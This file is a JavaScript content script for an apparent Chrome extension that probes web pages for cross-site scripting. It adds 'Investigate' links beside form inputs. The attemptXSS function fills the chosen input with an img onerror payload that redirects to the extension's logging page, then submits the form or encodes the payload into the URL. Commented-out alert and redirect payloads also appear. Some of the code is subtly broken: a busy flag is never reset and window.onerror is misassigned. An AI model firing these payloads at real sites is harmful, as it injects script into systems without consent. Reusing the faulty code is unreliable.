// Message handling logic - contains a flag to synchronously process messages
// to avoid async DB overwrites
var messageHandlerBusy = false;
var messageHandler = function(message, sender, sendResponse) {

  if (messageHandlerBusy) {
    window.setTimeout(function() {
      messageHandler(message, sender, sendResponse);
    }, 0);
    return;
  }

  messageHandlerBusy = true;

  chrome.storage.local.get(function(storage) {
  });
}

// Set messageHandler to listen to messages
chrome.runtime.onMessage.addListener(messageHandler);

// Attempt to run JS despite generated XSS errors
function ignoreerror() {
  return true;
}
window.onerror = ignoreerror();

window.addEventListener("load", function() {

  chrome.storage.local.get(function(storage) {
    var settings = storage["settings"];
    if (settings) {
      var sensitivity = settings["recommenderSensitivity"];
      var recommendationsEnabled = settings["recommendationsEnabled"];
      if (recommendationsEnabled && sensitivity) {
        addRecommendationsToPage(sensitivity);
      }
    }
  });

}, false);

// This adds the "Investigate form" inputs to the page
// as per the set sensitivity
function addRecommendationsToPage(sensitivity) {

  // Inject "Investigate Form" buttons on input
  var forms = document.getElementsByTagName("form");

  if (sensitivity === "1") {
    // Add a button to the first input per form
    setTimeout(function() {
      for (var i = 0; i < forms.length; i++) {
        var currForm = forms[i];
        var inputs = currForm.getElementsByTagName("input");
        if (!inputs.length) {
          continue;
        }
        var firstInputChild = inputs[0];

        var recommendation = document.createElement('a');
        recommendation.classList.add("recommendation");
        var text = document.createTextNode("Investigate form");
        recommendation.appendChild(text);
        // Make it look clickable
        recommendation.setAttribute("href", "javascript:void(0)");

        recommendation.child = firstInputChild;
        recommendation.form = currForm;

        // Create new div wrapper for element to be next to input
        var newParent = document.createElement("div");
        newParent.appendChild(firstInputChild);
        newParent.appendChild(recommendation);
        currForm.insertBefore(newParent, currForm.firstChild);

        // Attempt XSS (or otherwise) upon clicking the form
        recommendation.addEventListener('click', function(evt) {
          // toggleAttackSelection(recommendation, evt.target.child, evt.target.form);
          attemptXSS(evt.target.child, evt.target.form);
        });

      }
    }, 500);
  } else if (sensitivity === "2") {
    // Add a button for every input in a form

    setTimeout(function() {
      for (var i = 0; i < forms.length; i++) {
        var currForm = forms[i];
        var inputs = currForm.getElementsByTagName("input");

        if (!inputs.length) {
          continue;
        }

        for (var j = 0; j < inputs.length; j++) {
          var currInput = inputs[j];

          var recommendation = document.createElement('a');
          recommendation.classList.add("recommendation");
          var text = document.createTextNode("Investigate input");
          recommendation.appendChild(text);
          // Make it look clickable
          recommendation.setAttribute("href", "javascript:void(0)");

          recommendation.child = currInput;
          recommendation.form = currForm;

          // Attempt XSS (or otherwise) upon clicking the form
          recommendation.addEventListener('click', function(evt) {
            attemptXSS(evt.target.child, evt.target.form);
          });

          // Create new div wrapper for element to be next to input
          var newParent = document.createElement("div");
          var oldParent = currInput.parentNode;
          var oldSibling = currInput.nextSibling;
          newParent.appendChild(currInput);
          newParent.appendChild(recommendation);

          // currForm.insertBefore(newParent, currForm.firstChild);
          oldParent.insertBefore(newParent, oldSibling);
        }
      }
    }, 500);
  } else if (sensitivity === "3") {
    // Add a button for every input regardless of forms

    setTimeout(function() {

      var inputs = document.getElementsByTagName("input");

      if (!inputs.length) {
        return;
      }

      for (var i = 0; i < inputs.length; i++) {
        var currInput = inputs[i];
        var recommendation = document.createElement('a');
        recommendation.classList.add("recommendation");
        var text = document.createTextNode("Investigate input");
        recommendation.appendChild(text);
        // Make it look clickable
        recommendation.setAttribute("href", "javascript:void(0)");

        // recommendation.child = currInput;

        // Attempt XSS (or otherwise) upon clicking the form
        recommendation.addEventListener("click", function(evt) {
          attemptXSS(evt.target.parentElement.firstChild, null);
        });

        // Create new div wrapper for element to be next to input
        var newParent = document.createElement("div");
        var oldParent = currInput.parentNode;
        var oldSibling = currInput.nextSibling;
        newParent.appendChild(currInput);
        newParent.appendChild(recommendation);

        oldParent.insertBefore(newParent, oldSibling);
      }
    }, 500);
  }
}

// function toggleAttackSelection(parentElem, child, parentForm) {
//   var selectForm = document.createElement("select");
//   console.log("all attacks are");
//   console.log(allAttacks);
//   for (var i = 0; i < allAttacks.length; i++) {
//     var currAttack = allAttacks[i];
//     var option = document.createElement("option");
//     option.value = currAttack.name;
//     option.innerHTML = currAttack.name;
//     selectForm.appendChild(option);
//   }
//   parentElem.appendChild(selectForm);

// }

// This method attempts an XSS attack by using an exploit string,
// adding it as input to the page
function attemptXSS(inputElement, parentForm) {
  // Here is one attempt - I'd want to pass arguments such as time limit, as well as a library of inputs to fuzz etc
  // inputElement.value = "<img src=a onerror=\"alert('XSS Attack')\">";
  // inputElement.value = "<img src=a onerror=\"alert('henlo');window.location.replace('http://www.miniclip.com')\">";
  var extId = chrome.runtime.id;
  var currLoc = window.location;

  // Whenever I get a chance to run JS as an exploit (XSS), make a request to the extension
  // Request logger stores referral URL's as weak URL's from which you can trigger an XSS exploit
  var jsExploitStr = "window.location.replace('chrome-extension://" + extId + "/request_logger.html?ref=" + currLoc;

  // Specific attack (using onerror element of image)
  inputElement.value = "<img src=a onerror=\"" + jsExploitStr + "')\">";

  // Submit form / input
  if (parentForm) {
    console.log("ATTACK STARTED");
    parentForm.submit();
  } else {

    // Attempt to submit the page by appropriately encoding the data into the URL
    // as a query parameter
    var dataName = inputElement.name;
    var baseURL = location.protocol + '//' + location.host + location.pathname;

    var encodedValue = inputElement.value.replace("%20", "+").replace("&", "%26");

    console.log("ATTACK STARTED");
    window.location.href = baseURL + "?" + dataName + "=" + encodedValue;
  }
}

